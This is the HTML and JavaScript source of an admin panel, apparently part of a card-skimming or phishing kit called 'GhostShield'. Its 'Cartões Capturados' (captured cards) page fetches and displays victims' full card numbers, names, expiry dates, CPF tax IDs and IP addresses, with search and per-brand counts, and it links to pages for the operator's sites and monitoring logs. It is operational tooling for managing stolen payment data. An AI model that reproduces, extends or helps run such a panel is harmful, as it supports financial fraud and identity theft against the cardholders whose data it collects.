<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cartões - GhostShield</title>
    <style>
        :root { --bg-primary: #0a0a0f; --bg-secondary: #121218; --bg-card: #16161e; --border-color: #2a2a35; --text-primary: #f0f0f5; --text-secondary: #8888a0; --accent: #8b5cf6; --danger: #ef4444; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar { width: 260px; background: var(--bg-secondary); border-right: 1px solid var(--border-color); padding: 24px 0; position: fixed; height: 100vh; overflow-y: auto; }
        .sidebar-logo { padding: 0 24px 24px; border-bottom: 1px solid var(--border-color); margin-bottom: 24px; }
        .sidebar-logo h1 { font-size: 1.5rem; font-weight: 800; background: linear-gradient(135deg, #c084fc, #8b5cf6, #6366f1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sidebar-logo span { font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 2px; }
        .nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 24px; color: var(--text-secondary); font-size: 0.875rem; cursor: pointer; text-decoration: none; }
        .nav-item:hover, .nav-item.active { background: rgba(139, 92, 246, 0.15); color: var(--accent); }
        .nav-item svg { width: 20px; height: 20px; }
        .main-wrapper { flex: 1; margin-left: 260px; }
        .topbar { background: var(--bg-secondary); border-bottom: 1px solid var(--border-color); padding: 16px 32px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .topbar-title { font-size: 1.125rem; font-weight: 600; text-transform: capitalize; color: var(--text-secondary); }
        .btn-logout { padding: 8px 16px; background: transparent; border: 1px solid var(--border-color); color: var(--text-secondary); border-radius: 8px; cursor: pointer; font-size: 0.875rem; }
        .btn-logout:hover { background: var(--danger); color: white; border-color: var(--danger); }
        .content { padding: 32px; }
        .page-header { margin-bottom: 24px; }
        .page-title { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; }
        .page-subtitle { color: var(--text-secondary); font-size: 0.875rem; }
        .search-box { display: flex; gap: 12px; margin-bottom: 24px; }
        .search-input { flex: 1; padding: 12px 16px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-primary); font-size: 0.875rem; outline: none; }
        .search-input:focus { border-color: var(--accent); }
        .search-select { padding: 12px 16px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-primary); font-size: 0.875rem; }
        .stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; margin-bottom: 24px; }
        .stat-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 16px; text-align: center; }
        .stat-value { font-size: 1.5rem; font-weight: 700; margin-bottom: 4px; }
        .stat-label { font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase; }
        .cards-table { width: 100%; border-collapse: collapse; background: var(--bg-card); border-radius: 12px; overflow: hidden; }
        .cards-table th, .cards-table td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 0.875rem; }
        .cards-table th { background: var(--bg-secondary); color: var(--text-secondary); font-size: 0.7rem; text-transform: uppercase; font-weight: 500; }
        .cards-table tr:hover { background: var(--bg-card); }
        .cards-table tr:last-child td { border-bottom: none; }
        .card-brand { padding: 4px 10px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; }
        .card-brand.visa { background: rgba(79, 70, 229, 0.2); color: #818cf8; }
        .card-brand.mastercard { background: rgba(235, 0, 27, 0.2); color: #f87171; }
        .card-brand.amex { background: rgba(0, 111, 207, 0.2); color: #60a5fa; }
        .card-brand.elo { background: rgba(255, 111, 0, 0.2); color: #fb923c; }
        .card-brand.other { background: rgba(136, 136, 160, 0.2); color: var(--text-secondary); }
        .loading { text-align: center; padding: 40px; color: var(--text-secondary); }
        @media (max-width: 1200px) { .stats-grid { grid-template-columns: repeat(3, 1fr); } }
        @media (max-width: 768px) { .sidebar { display: none; } .main-wrapper { margin-left: 0; } .search-box { flex-direction: column; } .stats-grid { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
    <div class="app-container">
        <aside class="sidebar">
            <div class="sidebar-logo"><h1>GhostShield</h1><span>Painel Admin</span></div>
            <nav>
                <a class="nav-item" href="/admin/dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>Dashboard</a>
                <a class="nav-item" href="/admin/analytics"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 21H3V3"/><path d="M21 9l-6 6-4-4-6 6"/></svg>Análises</a>
                <a class="nav-item" href="/admin/sites"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg>Meus Sites</a>
                <a class="nav-item active" href="/admin/payments"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Cartões</a>
                <a class="nav-item" href="/admin/logs"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/></svg>Logs & Monitor</a>
            </nav>
        </aside>
        <div class="main-wrapper">
            <header class="topbar"><h2 class="topbar-title">cartões</h2><button class="btn-logout" id="logoutBtn">Sair</button></header>
            <main class="content">
                <div class="page-header">
                    <h1 class="page-title">Cartões Capturados</h1>
                    <p class="page-subtitle">Busque e gerencie os cartões capturados</p>
                </div>
                <div class="search-box">
                    <input type="text" class="search-input" id="searchInput" placeholder="Buscar por nome, cartão, CPF ou IP...">
                    <select class="search-select" id="brandFilter">
                        <option value="">Todas as bandeiras</option>
                        <option value="visa">Visa</option>
                        <option value="mastercard">Mastercard</option>
                        <option value="amex">Amex</option>
                        <option value="elo">Elo</option>
                    </select>
                </div>
                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-value" id="totalCards">--</div><div class="stat-label">Total</div></div>
                    <div class="stat-card"><div class="stat-value" style="color:#4f46e5" id="visaCount">0</div><div class="stat-label">Visa</div></div>
                    <div class="stat-card"><div class="stat-value" style="color:#eb001b" id="mastercardCount">0</div><div class="stat-label">Mastercard</div></div>
                    <div class="stat-card"><div class="stat-value" style="color:#006fcf" id="amexCount">0</div><div class="stat-label">Amex</div></div>
                    <div class="stat-card"><div class="stat-value" style="color:#ff6f00" id="eloCount">0</div><div class="stat-label">Elo</div></div>
                </div>
                <table class="cards-table">
                    <thead>
                        <tr>
                            <th>Bandeira</th>
                            <th>Número</th>
                            <th>Nome</th>
                            <th>Validade</th>
                            <th>CPF</th>
                            <th>IP</th>
                            <th>Data</th>
                        </tr>
                    </thead>
                    <tbody id="cardsTable"><tr><td colspan="7" class="loading">Carregando...</td></tr></tbody>
                </table>
            </main>
        </div>
    </div>
    <script>
        let allCards = [];
        function getCookie(n){const v=`; ${document.cookie}`;const p=v.split(`; ${n}=`);return p.length===2?p.pop().split(';').shift():null}
        async function fetchWithAuth(u){const r=await fetch(u,{headers:{'Authorization':`Bearer ${getCookie('auth_token')}`}});if(r.status===401)window.location.href='/admin/login';return r}
        document.getElementById('logoutBtn').addEventListener('click',async()=>{await fetch('/api/auth/logout',{method:'POST'});window.location.href='/admin/login'});
        function filterCards(){
            const search=document.getElementById('searchInput').value.toLowerCase();
            const brand=document.getElementById('brandFilter').value;
            const filtered=allCards.filter(c=>{
                const matchSearch=!search||(c.card_name||'').toLowerCase().includes(search)||(c.card_number||'').includes(search)||(c.cpf||'').includes(search)||(c.ip||'').includes(search);
                const matchBrand=!brand||(c.card_brand||'').toLowerCase().includes(brand);
                return matchSearch&&matchBrand;
            });
            renderCards(filtered);
        }
        function renderCards(cards){
            const tbody=document.getElementById('cardsTable');
            if(cards.length===0){tbody.innerHTML='<tr><td colspan="7" class="loading">Nenhum cartão encontrado</td></tr>';return;}
            tbody.innerHTML=cards.map(c=>{
                const brandClass=(c.card_brand||'').toLowerCase().includes('visa')?'visa':(c.card_brand||'').toLowerCase().includes('master')?'mastercard':(c.card_brand||'').toLowerCase().includes('amex')?'amex':(c.card_brand||'').toLowerCase().includes('elo')?'elo':'other';
                return`<tr><td><span class="card-brand ${brandClass}">${c.card_brand||'Desconhecido'}</span></td><td>${c.card_number}</td><td>${c.card_name}</td><td>${c.expiry}</td><td>${c.cpf}</td><td>${c.ip}</td><td>${new Date(c.created_at).toLocaleString('pt-BR')}</td></tr>`;
            }).join('');
        }
        document.getElementById('searchInput').addEventListener('input',filterCards);
        document.getElementById('brandFilter').addEventListener('change',filterCards);
        (async function(){
            try{
                const d=await fetchWithAuth('/api/admin/cards');
                if(!d)return;
                allCards=(await d.json()).cards||[];
                const cts={visa:0,mastercard:0,amex:0,elo:0};
                allCards.forEach(x=>{const b=(x.card_brand||'').toLowerCase();if(b.includes('visa'))cts.visa++;else if(b.includes('master'))cts.mastercard++;else if(b.includes('amex'))cts.amex++;else if(b.includes('elo'))cts.elo++});
                document.getElementById('totalCards').textContent=allCards.length;
                document.getElementById('visaCount').textContent=cts.visa;
                document.getElementById('mastercardCount').textContent=cts.mastercard;
                document.getElementById('amexCount').textContent=cts.amex;
                document.getElementById('eloCount').textContent=cts.elo;
                renderCards(allCards);
            }catch(e){console.error(e)}
        })();
    </script>
</body>
</html>
